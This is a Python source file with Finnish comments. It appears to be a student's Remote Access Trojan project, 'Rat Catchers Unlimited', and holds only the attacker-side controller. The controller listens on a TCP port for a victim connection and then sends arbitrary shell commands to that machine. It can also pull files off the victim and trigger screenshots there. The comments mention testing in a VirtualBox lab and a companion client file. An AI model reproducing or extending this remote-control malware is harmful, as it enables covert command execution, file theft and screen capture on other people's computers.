
# Rat Catchers Unlimited
# itse käytin virtualboxia host-only-connection
# aja attacker.py ensiksi
# vaihtakaa kumpaankin tiedostoon ip:t
# komento download + tiedostonNimi --> pelkkä download kaataa ohjelman, korjataan myöhemmin
# komento screen ottaa kuvankaappauksen. ja tallentaa sen nimellä screen.jpg
# terminaalissa pitäis toimia kaikki komennot win/linux
# voi laukauista ohjelmia esim notepadin cmd:ltä mutta cmd leikkaa vielä kiinni
# kuvankaappus mulla kusahti Kali Linuxilla. Toimi hyvin windowsissa
# En saanut upload functiota toimimaan jostain syystä. liitetään se myöhemmin 
# --> se on lähes reverse downloadista. meni hermo :)
# vain 60 rivii koodii per tiedosto.. ihan kiva alku

import socket
import os
import sys

socket.setdefaulttimeout(15)

def clear_screen():
    os.system('cls')

def download(target, command):
    filename = command.split()[1]
    with open(filename, 'wb') as f:
        while True:
            bits = target.recv(1024)
            #kun löydetään endpoint niin tiedetään että tiedosto on luettu kokonaisuudessaan
            if b'DONE' in bits:
                #poistean vikat 4 merkkiä (DONE)
                f.write(bits[:-4])
                print('Transfer complete')
                break
            elif b'File not found' in bits:
                print('File not found')
                break
            else:
                f.write(bits)

#pääfunktio
def main():
    #vaihtakaa oma ip
    attacker_ip = '192.168.83.1'
    port        = 8888
    
    #luodaan socket (ipv4 & tcp) ja jäädään odottamaan yhteyttä
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((attacker_ip, port))
    s.listen(1)
    print(f'\n[+] Waiting for new connection...')

    #target on itse yhteys ja target_addr on tuple (index0 = ip ja index1 = random port)
    try:
        target, target_addr = s.accept()
    except TimeoutError:
        print('timeout')
        sys.exit(1)


    print(f'[+] New Connection from {target_addr[0]}\n')

    while True:
        #muutetaan komento heti byteiksi että voidaan lähettää targettiin (.encode())
        command = input('RatShell >> ').encode()
        if command == b'exit':  
            target.send(command)
            target.close()
            s.close()
            break
        elif command == b'':
            continue
        elif command == b'cls':
            clear_screen()
        elif command.startswith(b'download'):
            target.send(command)
            download(target,command)
        elif command.startswith(b'screen'):
            target.send(command)
        else:
            target.send(command)
            #luetaan max 4kb sisään. decode muuttaa bytet takaisin perus stringeiksi
            result = target.recv(4096).decode('ISO-8859-1')
            print(result)


if __name__ == '__main__':
    main()